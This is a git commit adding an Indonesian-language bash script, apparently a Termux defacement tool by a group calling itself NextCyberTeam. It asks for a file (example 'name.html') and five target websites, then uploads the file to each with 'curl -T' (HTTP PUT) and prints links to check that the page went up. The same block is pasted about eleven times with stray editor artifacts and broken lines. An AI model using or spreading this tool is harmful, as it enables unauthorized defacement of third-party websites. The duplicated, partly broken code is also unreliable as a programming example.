3ce886d1da3840a1fe43a357e51e9e495edd8325
NextCyberTeam <49360164+NextCyberTeam@users.noreply.github.com>
2019-04-07 15:37:10 +0700

    Create nextch.sh

---
+++ nextch.sh
@@ -0,0 +1,503 @@
+GNU nano 4.0                                  nextch.sh
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo " silahkan gunakan" | lolcat
+echo
+echo
+echo
+echo "MASUKAN NAMA ANDA===>"
+read anda
+
+echo "MASUKAN NAMA TEAM ANDA===>"
+read team
+
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $ red "Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
+echo
+echo $green"*SCRIPT NYA TARUH DI LUAR FOLDER INTERNAL*"
+echo $red"[+]====================================================[+]"
+echo $red"Masukan nama script contoh $anda.html"
+read -p "[=======>" script
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke2"
+read -p "[=======>" Ke2
+curl -T /storage/emulated/0/$script $Ke2
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke3"
+read -p "[=======>" Ke3
+curl -T /storage/emulated/0/$script $Ke3
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke4"
+read -p "[=======>" Ke4
+curl -T /storage/emulated/0/$script $Ke4
+echo $red"[+]====================================================[+]"
+echo $red"[+]====================================================[+]"
+echo $green"Masukan Web Target Ke5"
+read -p "[=======>" Ke5
+curl -T /storage/emulated/0/$script $Ke5
+echo
+echo
+echo toilet -f standard "HASIL" | lolcat
+echo $red"Kalau Gagal Jan Nangid Kek Bocah Aja _-"
+echo $green
+echo "Silahkan Cek Web $Ke1/$script"
+echo "Silahkan Cek Web $Ke2/$script"
+echo "Silahkan Cek Web $Ke3/$script"
+echo "Silahkan Cek Web $Ke4/$script"
+echo "Silahkan Cek Web $Ke5/$script"
+echo
+echo "TERIMAH KASIH TELAH MEMAKAI TOOL KAMI $anda dari $team"
+echo
+echo
+gema
